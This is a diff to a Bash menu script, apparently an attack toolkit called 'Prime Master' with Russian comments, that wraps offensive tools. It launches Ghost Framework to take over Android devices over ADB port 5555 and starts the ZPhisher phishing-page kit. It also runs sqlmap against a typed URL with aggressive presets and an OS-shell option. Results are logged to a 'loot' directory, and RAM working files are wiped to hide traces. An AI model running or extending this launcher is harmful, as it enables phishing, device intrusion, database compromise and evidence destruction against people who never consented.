@@ -75,6 +75,37 @@ prime_dynamic_controller() {
     done
 }
 
+print_header() {
+    local title="$1"
+    clear
+    echo -e "${R}--------------------------------------------------${NC}"
+    # Центрируем текст: 46 символов свободного места в рамке
+    # Используем printf для выравнивания
+    printf "${R}|%*s%s%*s|${NC}\n" $(((48-${#title})/2)) "" "$title" $(((49-${#title})/2)) ""
+    echo -e "${R}--------------------------------------------------${NC}"
+}
+
+# Типы: i (info), s (success), e (error), w (warning)
+print_status() {
+    local type="$1"
+    local msg="$2"
+    case "$type" in
+        "i") echo -e "${B}[*] ${NC}$msg" ;;
+        "s") echo -e "${G}[+] ${NC}$msg" ;;
+        "e") echo -e "${R}[!] ${NC}$msg" ;;
+        "w") echo -e "${Y}[?] ${NC}$msg" ;;
+        *) echo -e "$msg" ;;
+    esac
+}
+
+log_loot() {
+    local module="$1"
+    local data="$2"
+    local file="/root/prime_loot/${module}_results.txt"
+    echo "[$(date +%T)] $data" >> "$file"
+}
+
+
 
 # --- Конец  Модулей ---
 # --- ГЛАВНОЕ МЕНЮ ---
@@ -133,126 +164,149 @@ run_servers() {
 
 # --- Модули по меню ---
 run_ghost_commander() {
-    clear
-    echo -e "${R}--------------------------------------------------${NC}"
-    echo -e "${R}    PRIME MASTER: GHOST COMMANDER (ANDROID/IOT)   ${NC}"
-    echo -e "${R}--------------------------------------------------${NC}"
+    # Использование унифицированной шапки
+    print_header "GHOST COMMANDER (ANDROID/IOT)"
 
-    # Динамический поиск пути к Ghost
+    # Эвристический поиск пути
     local GHOST_PATH=$(find /root /home /opt -maxdepth 2 -type d -name "Ghost" 2>/dev/null | head -n1)
     
     if [[ -z "$GHOST_PATH" ]]; then
-        echo -e "${R}[!] Error: Ghost Framework not found.${NC}"
+        print_status "e" "Ghost Framework not found in system paths."
         pause; return
     fi
 
-    read -p "Enter Target IP (Leave empty for Manual Console): " TARGET_IP
+    echo -en "${Y}Enter Target IP ${W}(Leave empty for Manual Console)${Y}: ${NC}"
+    read -r TARGET_IP
 
     if [[ -z "$TARGET_IP" ]]; then
-        echo -e "${B}[*] Launching Manual Ghost Console...${NC}"
+        print_status "i" "Launching Manual Ghost Console..."
+        # Изолированный запуск в суб-оболочке
         (cd "$GHOST_PATH" && python3 -m ghost)
     else
-        echo -e "${Y}[*] Pre-scanning target $TARGET_IP:5555...${NC}"
-        # Эвристическая проверка порта перед запуском тяжелого Python
-        if ! : >/dev/tcp/"$TARGET_IP"/5555 2>/dev/null; then
-            echo -e "${R}[!] Target port 5555 is closed. Proceed anyway? (y/n)${NC}"
-            read -r yn; [[ "$yn" != "y" ]] && return
+        print_status "i" "Pre-scanning target $TARGET_IP:5555..."
+        
+        # Эвристическая проверка порта через файловый дескриптор (без nmap)
+        if ! timeout 2 bash -c "cat < /dev/tcp/$TARGET_IP/5555" 2>/dev/null; then
+            print_status "w" "Target port 5555 (ADB) is closed or filtered."
+            echo -en "${Y}Proceed with forced connection? (y/n): ${NC}"
+            read -r yn
+            [[ "$yn" != "y" ]] && return
         fi
 
-        echo -e "${G}[*] Executing Auto-Connect...${NC}"
-        # Запуск в суб-оболочке ( ), чтобы не мусорить в основном процессе
+        print_status "s" "Executing Auto-Connect to $TARGET_IP..."
+        
+        # Логируем попытку подключения в loot
+        log_loot "ghost" "Attempting connection to $TARGET_IP"
+        
+        # Запуск с передачей команды напрямую в движок
         (cd "$GHOST_PATH" && python3 -m ghost --execute "connect $TARGET_IP")
     fi
 
-    echo -e "\n${Y}--------------------------------------------------${NC}"
     pause
 }
 
 
 run_phishing() {
-    clear
-    echo -e "${R}--------------------------------------------------${NC}"
-    echo -e "${R}      PRIME MASTER: SOCIAL ENGINEERING HUB        ${NC}"
-    echo -e "${R}--------------------------------------------------${NC}"
+    # 1. Унифицированная шапка
+    print_header "SOCIAL ENGINEERING HUB"
 
-    # 1. Эвристический поиск инструмента
-    local Z_PATH=$(find /root /home /opt -maxdepth 2 -type d -name "zphisher" 2>/dev/null | head -n1)
+    # 2. Эвристический поиск ZPhisher
+    local Z_PATH=$(find /root /home /opt /sdcard -maxdepth 2 -type d -name "zphisher" 2>/dev/null | head -n1)
 
-    # 2. Проверка наличия
     if [[ -z "$Z_PATH" ]]; then
-        echo -e "${R}[!] Error: zphisher not found.${NC}"
-        echo -e "${Y}[*] Suggestion: git clone https://github.com/htr-tech/zphisher $HOME/zphisher${NC}"
+        print_status "e" "ZPhisher not found in system paths."
+        print_status "i" "Suggestion: git clone https://github.com/htr-tech/zphisher"
         pause; return
     fi
 
-    # 3. Проверка критических зависимостей (PHP нужен для серверов zphisher)
+    # 3. Проверка критических зависимостей
     if ! command -v php >/dev/null 2>&1; then
-        echo -e "${Y}[!] Warning: PHP not found. Phishing pages may not start.${NC}"
-        read -p "Try to run anyway? (y/n): " yn
-        [[ "$yn" != "y" ]] && return
+        print_status "w" "PHP is missing. Phishing server will fail to start."
+        echo -en "${Y}Attempt to install dependencies? (y/n): ${NC}"
+        read -r inst
+        if [[ "$inst" == "y" ]]; then
+            apt update && apt install php -y
+        else
+            echo -en "${R}Continue without PHP? (y/n): ${NC}"
+            read -r yn
+            [[ "$yn" != "y" ]] && return
+        fi
     fi
 
-    # 4. Изолированный запуск
-    echo -e "${G}[*] Launching ZPhisher Engine...${NC}"
-    # Используем суб-оболочку, чтобы сохранить чистоту путей
+    # 4. Логирование и запуск
+    print_status "s" "Initializing ZPhisher Engine..."
+    log_loot "phishing" "Session started from $Z_PATH"
+
+    # Изолированный запуск в суб-оболочке
     ( 
         cd "$Z_PATH" || exit
-        # Проверяем исполняемость
         [[ ! -x "./zphisher.sh" ]] && chmod +x ./zphisher.sh 2>/dev/null
         ./zphisher.sh 
     )
 
-    echo -e "\n${Y}--------------------------------------------------${NC}"
     pause
 }
 
 
 run_sqlmap() {
-    clear
-    echo -e "${R}--------------------------------------------------${NC}"
-    echo -e "${R}        PRIME MASTER: SMART SQL INJECTION         ${NC}"
-    echo -e "${R}--------------------------------------------------${NC}"
+    # 1. Унифицированная шапка
+    print_header "SMART SQL INJECTION (SQLMAP)"
 
-    read -p "Enter Target URL: " target_url
+    echo -en "${Y}Enter Target URL: ${NC}"
+    read -r target_url
     [[ -z "$target_url" ]] && return
 
-    echo -e "${Y}[?] Select Aggression Level:${NC}"
-    echo -e " 1) Stealth  (Level 1, Risk 1) - Default"
-    echo -e " 2) Advanced (Level 3, Risk 2)"
-    echo -e " 3) Insane   (Level 5, Risk 3)"
-    read -p ">> " opt
+    # 2. Выбор агрессивности через эвристические пресеты
+    print_status "w" "Select Aggression Level:"
+    echo -e " 1) Stealth  ${W}(L1, R1)${NC} - Default"
+    echo -e " 2) Advanced ${W}(L3, R2, T5)${NC}"
+    echo -e " 3) Insane   ${W}(L5, R3, T10)${NC}"
+    echo -en "${Y}>> ${NC}"
+    read -r opt
 
     local args="--batch --random-agent --dbms=auto --shell"
     
-    # Эвристическая настройка параметров
     case "$opt" in
         2) args="$args --level 3 --risk 2 --threads 5" ;;
         3) args="$args --level 5 --risk 3 --threads 10 --flush-session" ;;
         *) args="$args --level 1 --risk 1" ;;
     esac
 
-    # Стелс-настройка: перенаправляем output во временную память (RAM), 
-    # чтобы не изнашивать память телефона и не оставлять логов в /root/.local/share/sqlmap
-    local tmp_dir="/dev/shm/.sqlmap_$RANDOM"
+    # 3. Стелс-настройка: работа в RAM (/dev/shm)
+    local tmp_dir="/dev/shm/.p_sql_$RANDOM"
     mkdir -p "$tmp_dir"
 
-    echo -e "${G}[*] Launching SQLmap Engine with $args...${NC}"
-    
-    # Запуск
-    sqlmap -u "$target_url" $args --output-dir="$tmp_dir"
+    print_status "i" "Launching SQLmap Engine..."
+    print_status "i" "Mode: $args"
 
-    # Проверка результатов
+    # Запуск процесса
+    sqlmap -u "$target_url" $args --output-dir="$tmp_dir" --answers="quit=N,follow=Y"
+
+    # 4. Анализ результата и сохранение "лута"
     if [[ -d "$tmp_dir" ]]; then
+        # Ищем файл лога, где sqlmap подтверждает инъекцию
         local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
-        if [[ -n "$log_file" ]]; then
-            echo -e "${G}[!!!] VULNERABILITY FOUND! Summary saved to loot.${NC}"
-            cat "$log_file" >> /root/prime_loot/sql_success.txt
+        
+        if [[ -n "$log_file" && -s "$log_file" ]]; then
+            print_status "s" "VULNERABILITY CONFIRMED!"
+            local summary=$(grep -E "Target|Payload|Type" "$log_file" | tail -n 5)
+            
+            # Сохраняем в общий лог лута
+            log_loot "sqlmap" "SUCCESS: $target_url | Data: $summary"
+            
+            # Дублируем в специальный файл успешных инъекций
+            echo -e "--- [ $(date) ] ---\nURL: $target_url\n$summary\n" >> /root/prime_loot/sql_success.txt
+            
+            print_status "s" "Report saved to: /root/prime_loot/sql_success.txt"
+        else
+            print_status "e" "No injection points found or target is protected."
         fi
-        # Полная зачистка следов в RAM
+        
+        # 5. Мгновенная зачистка следов в RAM
         rm -rf "$tmp_dir"
+        print_status "i" "RAM session cleared."
     fi
 
-    echo -e "\n${Y}--------------------------------------------------${NC}"
     pause
 }
 
